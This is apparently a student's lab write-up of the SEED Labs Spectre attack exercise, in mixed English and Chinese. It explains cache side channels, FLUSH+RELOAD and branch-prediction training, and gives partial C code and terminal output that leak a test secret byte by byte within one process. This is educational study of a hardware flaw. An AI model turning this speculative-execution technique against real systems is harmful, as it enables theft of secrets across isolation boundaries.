https://seedsecuritylabs.org/Labs_16.04/System/Spectre_Attack/

Based on the task file, we could start the lab.

Break inter-process and intra-process isolation.

In order to better understand this lab, it breaks into several parts, covering a number of topics described in the following:

- Spectre attack
- Side channel attack
- CPU caching
- Out-of-order execution and branch prediction inside CPU microarchitecture.

`-march=native` flag needs to be added when compiling the code with gcc. The `march` flag tells the compiler to enable all instruction subsets supported by the local machine. For example:

```shell
$ gcc -march=native -o test test.c
```

## 1. Task1 and 2: Side Channel Attacks via CPU Caches

Both Meltdown and Spectre utilize the side channel attack via CPU cache to steal the protected secrets：FLUSH+RELOAD. CPU cache always supported by hardware and reduced the performance overhead to access the memory.

### 1.1. Task1: CPU Cache V.S. Memory

Cache is faster than memory access. 

`CacheTime.c`

- An array with 10*4096
- Access `array[3*4096]` and `array[7*4096]` first，then those two elements will be loaded into cache
- Then access the elements from 0 to 10 and count the time cycles

```c
time1 = __rdtscp(&junk);
junk =*addr;
time2 = __rdtscp(&junk) - time1;
```

Caching is cache block level, not byte level. One blcok is 64 bytes, so the definition of an element of the array is 4096 which can be larger than 64bytes to avoid the same cache block loading.



Two ways: Temporaly, spacials

nearby, 4096 is one page

Tag stores in the cache

#### Compile and Run

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native CacheTime.c -o CacheTime
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./CacheTime 
Access time for array[0*4096]: 2660 CPU cycles
Access time for array[1*4096]: 326 CPU cycles
Access time for array[2*4096]: 312 CPU cycles
Access time for array[3*4096]: 142 CPU cycles
Access time for array[4*4096]: 302 CPU cycles
Access time for array[5*4096]: 287 CPU cycles
Access time for array[6*4096]: 306 CPU cycles
Access time for array[7*4096]: 123 CPU cycles
Access time for array[8*4096]: 300 CPU cycles
Access time for array[9*4096]: 290 CPU cycles
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./CacheTime 
Access time for array[0*4096]: 77 CPU cycles
Access time for array[1*4096]: 172 CPU cycles
Access time for array[2*4096]: 164 CPU cycles
Access time for array[3*4096]: 22 CPU cycles
Access time for array[4*4096]: 168 CPU cycles
Access time for array[5*4096]: 170 CPU cycles
Access time for array[6*4096]: 166 CPU cycles
Access time for array[7*4096]: 23 CPU cycles
Access time for array[8*4096]: 168 CPU cycles
Access time for array[9*4096]: 164 CPU cycles
...
```

The CPU cycles of `array[3*4096]` and `array[7*4096]`are much faster then others。Except `array[0*4096]`, accessing value in CPU cache can be 130 faster than memory (the shredhold can bedifferent with different computers).

### 1.2. Task2: Side channel attack via CPU Cache

Side-channel attack can be used to steal secret.

- Assume the victim use the secret value as an index
- Assume this secret value can not be access by outside

But now we are going to use FLUSH+RELOAD to read this secret value。

- Flush the whole cache to make sure our array is not in the cache
- Run the victim program, it will use the secret value, then the value will be loaded into the cache
- Access the whole array one by onend count the access time. The fasteset one would be the secret value we want.

`FlushReload.c` is to find the first byte of the secret value via FLUSH+RELOAD technique. On byte of the secret have 256 posibilites (2^8).  Cache is block (64bytes)-level, even only one byte is accessed, the whole block will be loaded. In order to find the first byte, we define `array[k*4096], k=[0, 256]` when RELOAD. From the task1 we know,  `array[0*4096]` sometimes can be accessed very fast. 这个元素可能与相邻内存中的变量属于同一缓存块，因此可能会由于缓存这些变量而意外缓存。因此在FLUSH+RELOAD中，不会访问该元素。

consistant with 1024 (DELTA) offset. (why??)

```c
void victim(){
  temp = array[secret*4096 + DELTA];
}
```

#### Compile and run

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native FlushReload.c -o FlushReload
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./FlushReload 
array[94*4096 + 1024] is in cache.
The Secret = 94.
...
```

It can not be found every time, and we can change the shredhold based on your own computer, mine is 130, the lab used 80: 

```c
/*cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80)
```

## 2. Task3: out-of-order execution and prediction

### 2.1. out-of-oder execution

```c
1. data = 0;
2. if (x < size) {
3.   data = data + 5;
4. }
```

if size=10, x = 15, line 3 will never be executed

but CPU will run this line because of out-of-order execution.

这是因为现代计算机中使用乱序执行优化技术，以最大化地利用执行单元。当所需资源（比如x，size）已就位，CPU会执行并行执行相关语句。在当前操作执行的时候，CPU已经超前执行了其他语句。

第二行包含了两个操作：从内存中加载size的值，比较x和size。如果size的值没有在CPU的cache中，访问速度会很慢。因此CPU会预测比较结果，然后根据预测运行分支。因为这些操作在比较结果还没出来之前就执行了，所以称为乱序执行。

当乱序执行的时候，CPU会存储当前的状态和寄存器的值。在size的值访问到了之后，CPU再检查真实的比较结果。如果预测是正确的，就继续执行，如果预测是错误的，就恢复状态，所有预测的操作都会丢弃。

这个技术显著提升了CPU的性能，但是也引入了风险。因为虽然预测错误会丢弃操作，但是寄存器读取到的预测分支相关内存已经存储到了cache中且没有被丢弃。利用测信道攻击可以窃取该内存内容（很有可能有secret）。

### 2.2. 实验代码

```c
int main(){
  int i;
  // FLUSH the probing array
  flushSideChannel();
  // Train the CPU to take the true branch inside victim()
  // 使用比size（10）小的i训练CPU预测true分支
  for (i = 0; i < 10; i++) {
    _mm_clflush(&size);
    victim(i);
  }
  // Exploit the out-of-order execution
  _mm_clflush(&size);
  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i*4096 + DELTA]);
  // 使用比10大的97调用victim函数并刷新size的值，这样CPU要等待size的值，并且进入预测执行。
  victim(97);
  // RELOAD the probing array
  reloadSideChannel();
  return (0);
}
```

### 2.3. Task3

```c
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreExperiment 
array[97*4096 + 1024] is in cache.
The Secret = 97.
```

- 注释掉`_mm_clflush(&size);`和`_mm_clflush(&size);`
  - 因为size的值已经在cache中，CPU不用等待直接判断除了if的结果为false，不需要分支预测执行。因此测信道攻击失败
- 改为`victim(i+20)`
  - i+20比size大，CPU预测执行被训练为预测false。当调用victim函数的时候，虽然要等待size的值，但是CPU预测正确了执行语句，测信道攻击同样失败。

## 3. Task 4: Spectre attack

因为CPU不清除预测错误的执行内容，导致测信道攻击的可能性。利用这个漏洞，我们可以窃取同一个程序或不同程序的secret。该lab只实验了同一个程序的。

原理介绍：当浏览器访问不同服务器的网页的时候，它们是由同一个程序打开。浏览器的sandbox会为这些网页提供一个隔离环境，让它们不能互相访问。大多数软件的保护都是通过判断访问是否被granted。利用Spectre，可以让CPUs乱序执行，使其执行true分支即使访问被禁止了。

### 3.1. Attack

```c
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t restrictedAccess(size_t x){
  if (x < buffer_size) {
    return buffer[x];
  } else {
    return 0;
  }
}
```

Two regions: resticted region, non-retristed region protected by sandbox (if-condition). 

If x < buffer_size, return buffer[x]

else return none

攻击者只能通过sandbox去访问被限制访问的域。

### 3.2. SpectreAttack.c

The code defines the secret. Assume user can not access the secret or buffer_size, but can flush the cache. The target is to read the first byte via Spectre attack.

```c
char*secret = "Some Secret Value";
```

`size_t larger_x = (size_t)(secret - (char*)buffer);` calculate the offset of the secret from the buffer (assume the attacker already know the address of the secret). If the offset is larger than 10, it will call the  trestrictedAccess function. However, CPU will predict the true branch, so CPU will return the result of the true branch: buffer[larger_x]. It seems returning 0 from outside, but CPU already know buffer [larger_x].

#### Compile and run

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native SpectreAttack.c -o SpectreAttack
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreAttack 
array[0*4096 + 1024] is in cache.
The Secret = 0.
array[83*4096 + 1024] is in cache.
The Secret = 83.
```

Some times the`array[0*4096]` will be the results, we can modify the loop to [1， 256] and run multiple times to get `The Secret = 83`

## 4. Improve the Attack Accuracy

From previous results, sometimes they are noise, and sometimes are wrong answer. There are many reasons: the wrong shredhold or the CPU loads other values. Instead of run is multiple times manualy, we can write code to do it.

Create a score array for the 256 elements. If k is hit once, scores[k] will plus 1. After running multiple times, the highest score should be the results.

```c
for (i = 0; i < 256; i++) 
  scores[i] = 0;

for (i = 0; i < 1000; i++) {
  spectreAttack(larger_x);
	reloadSideChannelImproved();
}

int max = 0;
for (i = 0; i < 256; i++){
	if(scores[max] < scores[i])
	max = i;
}
```

But scores[0] always the largest.  In`void reloadSideChannelImproved()`function, modify the loop from [0, 256] to [1, 256].

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ gcc -march=native SpectreAttackImproved.c -o SpectreAttackImproved
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreAttackImproved Reading secret value at 0xffffe80c = The  secret value is 83
The number of hits is 7
```

## 5. Steal the Entire Secret String

Previous tasks only print out the first chracter, we need to modify the code to print out eh secret:

```c
int main() {
  int i;
  uint8_t s;
  
  for (int n = 0; n < 17; ++n)
  {
    size_t larger_x = (size_t)(secret-(char*)buffer+n);
    flushSideChannel();
    for(i=0;i<256; i++) scores[i]=0; 
    for (i = 0; i < 1000; i++) {
      spectreAttack(larger_x);
      reloadSideChannelImproved();
    }
    int max = 0;
    for (i = 0; i < 256; i++){
     if(scores[max] < scores[i])  
       max = i;
    }
    printf("The  secret value is '%c'\t", (char)max);
    printf("The number of hits is %d\n", scores[max]);
  }
  return (0); 
}
```

Compile and run mutiple times, we can get the final results：

```shell
[06/25/20]seed@VM:~/.../Spectre_Attack$ ./SpectreAttackImproved 
The  secret value is 'S'	The number of hits is 7
The  secret value is 'o'	The number of hits is 4
The  secret value is 'm'	The number of hits is 4
The  secret value is 'e'	The number of hits is 1
The  secret value is ' '	The number of hits is 2
The  secret value is 'S'	The number of hits is 3
The  secret value is 'e'	The number of hits is 3
The  secret value is 'c'	The number of hits is 1
The  secret value is 'r'	The number of hits is 1
The  secret value is 'e'	The number of hits is 3
The  secret value is 't'	The number of hits is 4
The  secret value is ' '	The number of hits is 3
The  secret value is 'V'	The number of hits is 1
The  secret value is 'a'	The number of hits is 4
The  secret value is 'l'	The number of hits is 1
The  secret value is 'u'	The number of hits is 2
The  secret value is 'e'	The number of hits is 2

```



